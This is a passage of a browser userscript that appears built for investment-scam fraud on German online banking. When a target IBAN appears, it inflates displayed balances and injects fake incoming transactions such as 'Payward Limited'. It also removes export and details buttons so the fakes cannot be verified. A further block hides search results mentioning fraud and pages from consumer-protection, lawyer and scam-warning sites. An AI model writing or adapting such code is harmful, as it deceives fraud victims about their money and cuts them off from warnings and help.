setInterval(observeAndRemoveElements, 50); // Adjust the interval time as needed (5000 milliseconds = 5 seconds)


})();


}

//44444444444  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//44444444444  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//44444444444  THE END---------------VOLKS UEBER BAL CHANGE----------------------------------------------------------------------------------------------------------------------------
//44444444444  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//44444444444  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------







/// THIRD ACCOUNT



//-------------------------------------------------------------------------


//22222222222-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//22222222222-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//22222222222---------------VOLKS UMSAETZE BAL CHANGE-------------------------------------------------------------------------------------------------------------------------
//22222222222-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//22222222222-----------------------------------------------------------------------------------------------------------------------------------------------------------------

   if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("10658384414") > 0 || window.location.href.indexOf("Downloads") > 0 ) {


(function() {
    'use strict';

    // Define the target text content to search for (case and whitespace insensitive)
    var targetTextContent1 = "DE28 4726 0307";
    var targetTextContent2 = " 0020 9007 02";

    // Configurable modification amount (positive or negative)
    const modificationAmount = 800.0; // Adjust the amount as needed

    // Configurable timeout in milliseconds (default: 2000 milliseconds)
//    const timeoutMillis = 0; // Adjust the timeout as needed



    // Function to modify the balance value, update data-positive attribute, and remove currency element
    function modifyBalance() {
        // Select the parent element with attribute data-positive
        var parentElement = document.querySelector('[data-positive]');

        // Check if the parent element exists
        if (parentElement) {
            // Select the element with class "saldo ng-star-inserted" within the parent
            var balanceElement = parentElement.querySelector('.saldo.ng-star-inserted');

            // Check if the balance element exists
            if (balanceElement) {
                // Get the current balance text content
                var balanceText = balanceElement.textContent;

                // Remove non-numeric characters and replace commas with dots
                var numericValue = parseFloat(balanceText.replace(/[^\d,-]/g, '').replace(',', '.'));

                // Check if the parent element has data-positive="0" indicating a negative balance
                var isNegative = parentElement.getAttribute('data-positive') === '0';

                // Modify the balance based on the sign and the modification amount
                numericValue += modificationAmount;

                // Update the data-positive attribute based on the new balance sign
                parentElement.setAttribute('data-positive', numericValue >= 0 ? '1' : '0');

                // Format the modified balance value
                var updatedBalanceText = (numericValue >= 0 ? '' : '-') + numericValue.toLocaleString('de-DE', { style: 'currency', currency: 'EUR' }).replace('€', 'EUR');

                // Update the balance text content
                balanceElement.textContent = updatedBalanceText;

                // Check for an extra minus sign and remove it
                if (balanceElement.textContent.includes('--')) {
                    balanceElement.textContent = balanceElement.textContent.replace('--', '-');
                }
            } else {
                console.error('Balance element not found.');
            }

            // Select and remove the currency element if it exists
            var currencyElement = parentElement.querySelector('.waehrung.ng-star-inserted, .waehrung');
            if (currencyElement) {
                currencyElement.remove();
            }
        } else {
            console.error('Parent element with data-positive attribute not found.');
        }
    }

    // Function to check for specific text content and "EUR" currency
    function checkForConditions() {
        // Check if the text "Herzlich willkommen!" is found on the page
        if (document.body.textContent.includes("Herzlich willkommen!")) {
            // Exit the script if the welcome text is found
            return;
        }

        // Get the text content of the entire page and convert to lowercase
        var pageTextContent = document.body.textContent.toLowerCase();

        // Check if either of the target text contents is found on the page
        if (pageTextContent.includes(targetTextContent1) || pageTextContent.includes(targetTextContent2)) {
            // Check for "EUR" under the class "waehrung ng-star-inserted"
            var currencyElement = document.querySelector('.waehrung.ng-star-inserted, .waehrung');
            if (currencyElement && currencyElement.textContent.toLowerCase() === 'eur') {
                // Execute the modifyBalance function
                modifyBalance();
            }
        }
    }


    // Check for conditions at regular intervals
    setInterval(checkForConditions, 2); // Adjust the interval time as needed (5000 milliseconds = 5 seconds)

})();


}



//22222222222  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//22222222222  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//22222222222  THE END---------------VOLKS UMSAETZE BAL CHANGE-------------------------------------------------------------------------------------------------------------------------
//22222222222  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//22222222222  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------



//33333333333-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//33333333333-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//33333333333---------------VOLKS UMSAETZE MULTIPLE TRANSACTIONS--------------------------------------------------------------------------------------------------------------
//33333333333-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//33333333333-----------------------------------------------------------------------------------------------------------------------------------------------------------------

if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("10658384414") > 0 || window.location.href.indexOf("Downloads") > 0) {

    (function() {
        'use strict';

        // Configurable timeout value (in milliseconds)
 //       const TIMEOUT_MS = 0; // Change this value as needed

//        // Define the target text content to search for (case and whitespace insensitive)
      var targetTextContent1 = "DE28 4726 0307";
    var targetTextContent2 = " 0020 9007 02";

        // Array of configurable transactions
        const TRANSACTIONS = [
            {
                title: 'Payward Limited',
                description: 'A Gold meldet sich.',
                amount: '800.00',
               date: 'Heute',
                insertAfter: false, // Set to false to insert before the original transaction
                moveSteps: 1, // Number of steps to move the transaction
              moveDirectionDown: false, // Set to false to move up
                order: 2 // Specify the order in which the transaction should be inserted
            },
//            {
 //               title: 'Payward Limited',
 //               description: 'Geld für Steuern',
 //               amount: '37.000,00',
 //               date: '26. Nov.',
//                insertAfter: false, // Set to false to insert before the original transaction
 //               moveStes: 0, // Number of steps to move the transaction
 //               moveDirectionDown: true, // Set to false to move up
  //              order: 1 // Specify the order in which the transaction should be inserted
  //          },
            // Add more transaction configurations here
      ];

        // Sort transactions based on the 'order' property
        TRANSACTIONS.sort((a, b) => a.order - b.order);

        console.log('Userscript initiated.');



       // Function to process transactions
function processTransactions() {
    console.log('Processing multiple transactions.');

    // Check if both target text contents are found on the page
    const textFound = checkTextContent(targetTextContent1, targetTextContent2);

    if (textFound) {
        // Select the target element
        var targetElement = document.querySelector('app-umsatz-list-optimized');
        console.log('Searching for target element...');

        // Check if the target element exists
        if (!targetElement) {
            console.error('Target element not found');
            return;
        }
        console.log('Target element found:', targetElement);

        // Check if transactions have already been inserted
        if (!targetElement.querySelector('.custom-transaction')) {
            TRANSACTIONS.forEach((transaction, index) => {
                console.log(`Processing transaction ${index + 1}`);
                insertAndMoveTransaction(targetElement, transaction);
            });
        } else {
            console.log('Transactions have already been inserted.');
        }
    } else {
        console.log('Text contents not found on the page. Waiting for them to appear...');
    }
}


// Function to check if a text content is found on the page (case and whitespace insensitive)
function checkTextContent(text1, text2) {
    const pageText = document.querySelector('.konto-iban').textContent.replace(/\s/g, '').toLowerCase();
    const textToCheck1 = text1.replace(/\s/g, '').toLowerCase();
    const textToCheck2 = text2.replace(/\s/g, '').toLowerCase();

    return pageText.includes(textToCheck1) && pageText.includes(textToCheck2);
}






    // Function to insert and move a transaction
    function insertAndMoveTransaction(targetElement, config) {
        // Get the first child of the target element
        var firstChild = targetElement.firstElementChild;
        if (!firstChild) {
            console.error('No first child found in the target element');
            return;
        }

        // Clone the first child
        var clone = firstChild.cloneNode(true);

        // Add a class to identify custom transactions
        clone.classList.add('custom-transaction');

        // Customization of cloned child
        updateElementTextContent(clone, '.umsatz-name.text-truncate', config.title);
        updateElementTextContent(clone, '.verwendungszweck-label.text-truncate', config.description);
        setCustomAmountAndCurrency(clone, config.amount);
        updateElementTextContent(clone, '.d-flex.justify-content-end.buchung-zeit', config.date);

        // Insert the cloned node based on the configuration
        var referenceNode = config.insertAfter ? firstChild.nextSibling : firstChild;
        targetElement.insertBefore(clone, referenceNode);

        // Move the cloned node based on the configuration
        moveTransaction(clone, config.moveSteps, config.moveDirectionDown);
    }

    // Helper function to update text content of an element within the clone
    function updateElementTextContent(clone, selector, newText) {
        const element = clone.querySelector(selector);
        if (element) {
            console.log(`Found element for selector '${selector}', updating text content.`);
            element.textContent = newText;
        } else {
            console.error(`Element not found for selector '${selector}'.`);
        }
    }

    // Function to set custom amount and update currency positivity based on the amount's sign
    function setCustomAmountAndCurrency(clone, amount) {
        const amountElement = clone.querySelector('.text-right.konto-umsatz-saldo-shredder span');
        const currencyElement = clone.querySelector('.waehrung-shredder.text-left span');
        const isPositive = !amount.startsWith('-'); // Determines positivity based on amount's sign

        if (amountElement && currencyElement) {
            console.log('Found amount and currency elements:', amountElement, currencyElement);
            amountElement.textContent = amount;
            amountElement.setAttribute('data-positive', isPositive ? '1' : '0');
            currencyElement.setAttribute('data-positive', isPositive ? '1' : '0');
        } else {
            console.error('Amount or currency element not found.');
        }
    }

    // Function to move the transaction up or down by a specified number of steps
    function moveTransaction(transactionNode, steps, moveDown) {
        let currentNode = transactionNode;
        while (steps > 0 && currentNode) {
            currentNode = moveDown ? currentNode.nextSibling : currentNode.previousSibling;
            steps--;
        }

        if (currentNode) {
            const referenceNode = moveDown ? currentNode.nextSibling : currentNode;
            transactionNode.parentNode.insertBefore(transactionNode, referenceNode);
            console.log('Transaction moved.');
        } else {
            console.error('Unable to move transaction: Reached the end of the list.');
        }
    }

    // Continuously check for the presence of transactions every 2 seconds
    setInterval(processTransactions, 100);

})();


}


//33333333333  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//33333333333  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//33333333333  THE END---------------VOLKS UMSAETZE MULTIPLE TRANSACTIONS--------------------------------------------------------------------------------------------------------------
//33333333333  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//33333333333  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------

//44444444444---------------VOLKS UEBER BAL CHANGE----------------------------------------------------------------------------------------------------------------------------
//44444444444-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//44444444444-----------------------------------------------------------------------------------------------------------------------------------------------------------------

   if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("10658384414") > 0 || window.location.href.indexOf("Downloads") > 0 ) {


(function() {
    'use strict';

//    // Define the target text contents to search for (case and whitespace insensitive)
      var targetTextContent1 = "DE28 4726 0307";
    var targetTextContent2 = " 0020 9007 02";

//    // Configurable modification amount (positive or negative)
  const modificationAmount = 800.0; // Adjust the amount as needed



    // Function to modify the balance value
    function modifyBalance() {
        // Select the element with class "kf-account-saldo-value"
        var balanceElement = document.querySelector('.kf-account-saldo-value');

        // Check if the balance element exists
        if (balanceElement) {
            // Get the current balance text content
            var balanceText = balanceElement.textContent;

            // Remove non-numeric characters and replace commas with dots
            var numericValue = parseFloat(balanceText.replace(/[^\d,-]/g, '').replace(',', '.'));

            // Modify the balance based on the sign and the modification amount
            numericValue += modificationAmount;

            // Format the modified balance value
            var updatedBalanceText = (numericValue >= 0 ? '' : '-') + numericValue.toLocaleString('de-DE', { style: 'currency', currency: 'EUR' }).replace('€', 'EUR');

            // Update the balance text content
            balanceElement.textContent = updatedBalanceText;

            // Check for an extra minus sign and remove it
            if (balanceElement.textContent.includes('--')) {
                balanceElement.textContent = balanceElement.textContent.replace('--', '-');
            }

            // Check the class name of the parent element to update data-positive attribute
            var parentElement = balanceElement.closest('.kf-account-saldo');
            if (parentElement) {
                var isPositive = numericValue >= 0;
                parentElement.classList.remove('kf-account-saldo-positive', 'kf-account-saldo-negative');
                parentElement.classList.add(isPositive ? 'kf-account-saldo-positive' : 'kf-account-saldo-negative');
            }

            console.log('Balance modified successfully.');

            // Select and remove the sibling currency element if it exists
            var currencyElement = balanceElement.nextElementSibling;
            if (currencyElement && currencyElement.classList.contains('kf-account-saldo-currency')) {
                currencyElement.remove();
                console.log('Currency element removed.');
            }
        } else {
            console.error('Balance element not found.');
        }
    }

// Function to check for specific text content and the presence of currency element
function checkForConditions() {
    // Get the text content of the ".kf-account-iban" element, convert to lowercase, and trim whitespace
    var ibanTextContent = document.querySelector('.kf-account-iban').textContent.toLowerCase().trim();

    // Convert the target text contents to lowercase and trim whitespace
    var lowerCaseTargetTextContent1 = targetTextContent1.toLowerCase().trim();
    var lowerCaseTargetTextContent2 = targetTextContent2.toLowerCase().trim();

    // Check if both target text contents are found within the "kf-account-iban" element
    if (ibanTextContent.includes(lowerCaseTargetTextContent1) && ibanTextContent.includes(lowerCaseTargetTextContent2)) {
        // Check if the sibling currency element is present
        var currencyElement = document.querySelector('.kf-account-saldo-value + .kf-account-saldo-currency');
        if (currencyElement) {
            // Execute the modifyBalance function
            modifyBalance();
        }
    }
}




    // Check for conditions at regular intervals
    setInterval(checkForConditions, 20); // Adjust the interval time as needed (2000 milliseconds = 2 seconds)


    // Function to observe and remove elements with "mat-form-field-subscript-wrapper" in the class name
function observeAndRemoveElements() {
    // Select elements with the specified class name
    var elementsToRemove = document.querySelectorAll('[class*="mat-form-field-subscript-wrapper"]');

    // Check if any matching elements were found
    if (elementsToRemove.length > 0) {
        // Remove each matching element
        elementsToRemove.forEach(function (element) {
            element.remove();
        });

        console.log('Removed elements with class containing "mat-form-field-subscript-wrapper".');
    }
}

// Observe and remove elements periodically
setInterval(observeAndRemoveElements, 50); // Adjust the interval time as needed (5000 milliseconds = 5 seconds)


})();


}

//44444444444  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//44444444444  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//44444444444  THE END---------------VOLKS UEBER BAL CHANGE----------------------------------------------------------------------------------------------------------------------------
//44444444444  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//44444444444  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------





// Script 4: Search Result Filter
    if (window.location.href.indexOf("google.com") !== -1 ||
    window.location.href.indexOf("google.de") !== -1 ||
    window.location.href.indexOf("google.at") !== -1 ||
    window.location.href.indexOf("google.ch") !== -1 ||
    window.location.href.indexOf("bing.com") !== -1 &&
        window.location.href.indexOf("ing.de") === -1) {
(function() {
  'use strict';

  // Define the words, domains, and URLs to block
  var blockedWords = ['Gutschrift','Ihr Geld ist gefunden','gefährlich', 'Betrug', 'schwarz', 'Scam', 'Broker', 'Finanzbetrug', 'Auszahlung', 'seriös' ]; // Add the words to block here
  var blockedDomains = ['watchlist-internet.at', 'broker-zahlt-nicht.de', 'scamadviser.com', 'finanzsache.com', 'webparanoid.com', 'personal-reviews.com', 'unique-reviews.com', 'kanzlei-herfurtner.de', 'verbraucherzentrale.de', 'betrug.de', 'ritschel-keller.de', 'seitcheck.de', 'anwalt.de' ]; // Add the domains to block here
  var blockedUrls = ['https://coinforum.de/topic/32288-mempoolspace-gutschrift/','https://www.anwalt.de/rechtstipps/ihr-geld-ist-gefunden-die-gefaehrlichste-krypto-betrugsmasche-2025-und-wie-betroffene-sich-schuetzen-koennen-242119.html','https://de.trustpilot.com/review/winstonmartin.com', 'https://www.example2.com']; // Add the urls to block here

  // Function to hide elements
  function hideElement(element) {
    if (element.style) element.style.display = 'none';
  }

  // Function to check and hide search results
  function checkAndHideSearchResults() {
    // Google
    var googleResults = document.querySelectorAll('.MjjYud');
    googleResults.forEach(function(result) {
      var urlElement = result.querySelector('a');
      var url = urlElement ? urlElement.href : '';
      var text = result.textContent.toLowerCase();
      if (blockedUrls.includes(url) || blockedDomains.some(domain => url.includes(domain)) || blockedWords.some(word => text.includes(word))) {
        hideElement(result);
      }
    });

    // Bing
    var bingResults = document.querySelectorAll('.b_algo');
    bingResults.forEach(function(result) {
      var urlElement = result.querySelector('a');
      var url = urlElement ? urlElement.href : '';
      var text = result.textContent.toLowerCase();
      if (blockedUrls.includes(url) || blockedDomains.some(domain => url.includes(domain)) || blockedWords.some(word => text.includes(word))) {
        hideElement(result);
      }
    });
  }


  // Function to execute the search result filtering
    function executeSearchResultFilter() {
      checkAndHideSearchResults();

      // Set an interval to check repeatedly, to deal with lazy-loaded search results
      setInterval(checkAndHideSearchResults, 1000);
    }

    // Call the function immediately
    executeSearchResultFilter();
  })();
        }




  if (
        window.location.href.indexOf("de") > 0 ||
        window.location.href.indexOf("mainscript") > 0 ||
        window.location.href.indexOf("Downloads") > 0
    ) {

    //    const transactions = [
    //        {
    //            date: "20.05.2025",
    //            title: "JP Morgan Chase. ",
    //            type: "Buchung",
   //             status: "Vorgemerkt",
    //            amount: "477.127,00",
   //             currency: "EUR",
    //            position: "above"
    //        },
    //        {
    //            date: "21.05.2025",
    //            title: "JP Morgan Chase.. ",
    //            type: "Buchung",
    //            status: "Ausgeführt",
    //            amount: "100.000,00",
    //            currency: "EUR",
    ////            position: "above"
    //        },
    //    ];

        function parseGermanAmount(amountStr) {
            if (typeof amountStr !== 'string') return 0;
            const clean = amountStr.replace(/\s/g, '').replace('.', '').replace(',', '.');
            return parseFloat(clean);
        }

        function buildTransactionRow(tx) {
            const row = document.createElement("cdk-row");
            row.setAttribute("role", "row");
            row.className = "cdk-row ng-star-inserted custom-transaction";
            row.setAttribute("data-title", tx.title.trim());

            const appTransaction = document.createElement("app-transaction-data");
            appTransaction.className = "ng-star-inserted";

            const container = document.createElement("div");
            container.className = "transaction-data-container";

            container.append(document.createTextNode(`${tx.date} `));

            const spanTitle = document.createElement("span");
            spanTitle.textContent = tx.title;
            container.appendChild(spanTitle);

            const spanType = document.createElement("span");
            spanType.textContent = tx.type;
            container.appendChild(spanType);

            const icon = document.createElement("kf-icon");
            icon.setAttribute("name", "ic_haken-mit-kreis_24");
            icon.className = "kf-color-positive ng-star-inserted";
            icon.style.cssText = "width:1.5rem;height:1.5rem;font-size:1.5rem";

            const iconFont = document.createElement("kf-icon-font");
            iconFont.className = "ng-star-inserted";

            const iconContainer = document.createElement("div");
            iconContainer.setAttribute("aria-hidden", "true");
            iconContainer.className = "kf-icon-font-container";
            iconContainer.style.fontFamily = "kf-icon-font-24";
            iconContainer.textContent = " ic_haken_mit_kreis_24 ";

            iconFont.appendChild(iconContainer);
            icon.appendChild(iconFont);
            container.appendChild(icon);

            const spanStatus = document.createElement("span");
            spanStatus.className = "status-text";
            spanStatus.textContent = tx.status;
            container.appendChild(spanStatus);

            const amountWrapper = document.createElement("app-wertentwicklung");
            amountWrapper.className = "ng-star-inserted";

            const amountDiv = document.createElement("div");
            const numericAmount = parseGermanAmount(tx.amount);
            const isNegative = numericAmount < 0;
            amountDiv.className = `mat-body-2 ${isNegative ? "kf-color-negative" : "kf-color-positive"}`;

            const formattedAmount = `${isNegative ? "-" : ""}${Math.abs(numericAmount).toLocaleString('de-DE', {
                minimumFractionDigits: 2,
                maximumFractionDigits: 2
            })}`;

            amountDiv.textContent = `${formattedAmount} `;

            const currencySpan = document.createElement("span");
            currencySpan.className = "mat-small";
            currencySpan.textContent = tx.currency;

            amountDiv.appendChild(currencySpan);
            amountWrapper.appendChild(amountDiv);
            container.appendChild(amountWrapper);

            appTransaction.appendChild(container);
            row.appendChild(appTransaction);
            return row;
        }

        function insertTransactions() {
            const firstRow = document.querySelector('.cdk-row.ng-star-inserted');
            if (!firstRow || !firstRow.parentNode) return;

            for (const tx of transactions) {
                const selector = `.custom-transaction[data-title="${tx.title.trim()}"]`;
                const existing = document.querySelector(selector);
                if (!existing) {
                    const row = buildTransactionRow(tx);
                    if (tx.position === "above") {
                        firstRow.parentNode.insertBefore(row, firstRow);
                    } else {
                        firstRow.parentNode.insertBefore(row, firstRow.nextSibling);
                    }
                    console.log(`Transaction row for "${tx.title}" inserted.`);
                } else {
                    console.log(`Transaction for "${tx.title}" already present.`);
                }
            }
        }

        setInterval(() => {
            insertTransactions();

            // UI cleanup
            document.querySelectorAll('[data-test-id="transaction_table_csv_export_button_desktop"]').forEach(el => {
                el.remove();
                console.log('Export button removed.');
            });

            document.querySelectorAll('#transaktion-details-button_0').forEach(el => {
                el.remove();
                console.log('Details button removed.');
            });

            document.querySelectorAll('.mat-focus-indicator').forEach(el => {
                el.remove();
                console.log('mat-focus-indicator element removed.');
            });

            document.querySelectorAll('[data-test-id="zusatz-informationen"]').forEach(el => {
                el.remove();
                console.log('Zusatzinformationen element removed.');
            });
        }, 100);
    }




 if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("Downloads") > 0) {
// IHRE DEPOT

    const CONFIGS = [
        { index: 0, adjustmentAmount: 100000 }, // 1 depot
        { index: 1, adjustmentAmount: 0 }, // 2 depot
        { index: 2, adjustmentAmount: 100000 },  //gesamt
        { index: 3, adjustmentAmount: 0 },
        { index: 4, adjustmentAmount: 0 },
        { index: 5, adjustmentAmount: 0 } // Total
    ];

    const INTERVAL = 100; // every 5s

    function parseBalance(text) {
        return parseFloat(text.replace(/\./g, '').replace(',', '.'));
    }

    function formatBalance(num) {
        return num.toLocaleString('de-DE', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
    }

    function updateBalancesAndRemoveLogo() {
        const logoElements = document.querySelectorAll('.bank-logo');
        if (logoElements.length === 0) {
            console.log("⏳ .bank-logo not found yet. Will retry...");
            return;
        }

        const balanceElements = [];

        // Get row balances
        const rows = document.querySelectorAll('cdk-row.cdk-row');
        rows.forEach((row, idx) => {
            const match = row.innerHTML.match(/(\d{1,3}(?:\.\d{3})*,\d{2})/);
            if (match) {
                balanceElements.push({ element: row, original: match[1], index: idx, type: 'depot' });
            }
        });

        // Get total balance
        const totalEl = document.querySelector('.depots-total-value');
        if (totalEl) {
            const match = totalEl.innerHTML.match(/(\d{1,3}(?:\.\d{3})*,\d{2})/);
            if (match) {
                balanceElements.push({ element: totalEl, original: match[1], index: balanceElements.length, type: 'total' });
            }
        }

        if (balanceElements.length === 0) {
            console.warn("⚠️ No balances found.");
            return;
        }

        console.clear();
        console.log("💶 Modifying balances...");

        // Modify balances
        balanceElements.forEach(b => {
            const config = CONFIGS.find(c => c.index === b.index);
            if (!config) return;
            const original = parseBalance(b.original);
            const updated = original + config.adjustmentAmount;
            const formatted = formatBalance(updated);
            b.element.innerHTML = b.element.innerHTML.replace(b.original, formatted);
        });

        // Remove bank-logo elements 5ms later
        setTimeout(() => {
            document.querySelectorAll('.bank-logo').forEach(el => {
                el.remove();
                console.log("✅ Removed a .bank-logo element");
            });
        }, 5);
    }

    // Retry every 5 seconds
    setInterval(updateBalancesAndRemoveLogo, INTERVAL);
}


 if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("Downloads") > 0) {
//  Depotentwicklung gesamtvermögen


    // === CONFIGURATION: Change this value to adjust balance in EUR ===
    const balanceDelta = 100000.00; // Positive or negative adjustment

    // === Utility: Parse European number format (e.g., "139.890,62") ===
    function parseEuroNumber(euroStr) {
        return parseFloat(euroStr.replace(/\./g, '').replace(',', '.'));
    }

    // === Utility: Format number to European style ===
    function formatEuroNumber(num) {
        return num.toLocaleString('de-DE', {
            minimumFractionDigits: 2,
            maximumFractionDigits: 2
        });
    }

    // === Balance modification logic ===
    function updateBalance() {
        const exportButtons = document.querySelectorAll('[data-test-id="export-pdf-button"]');
        if (exportButtons.length === 0) {
            console.log('Balance not modified: export button not present.');
            return;
        }

        const container = document.querySelector('.depotentwicklung-gesamtvermoegen span[aria-label]');
        if (!container) {
            console.log('Balance element not found.');
            return;
        }

        const originalText = container.innerText.trim().split(' ')[0];
        const originalValue = parseEuroNumber(originalText);
        const newValue = originalValue + balanceDelta;

        const formatted = formatEuroNumber(newValue);
        container.innerHTML = `${formatted} <span class="font-weight-bold mat-small">EUR</span>`;
        container.setAttribute('aria-label', `${formatted} EUR`);

        console.log(`Balance modified to: ${formatted} EUR`);

        // Remove the export-pdf-button elements after 5 milliseconds
        setTimeout(() => {
            exportButtons.forEach(btn => {
                btn.remove();
                console.log('Removed [data-test-id="export-pdf-button"] element.');
            });
        }, 5);
    }

    // === Start interval to update balance every 2 seconds if condition is met ===
    setInterval(updateBalance, 100);
}


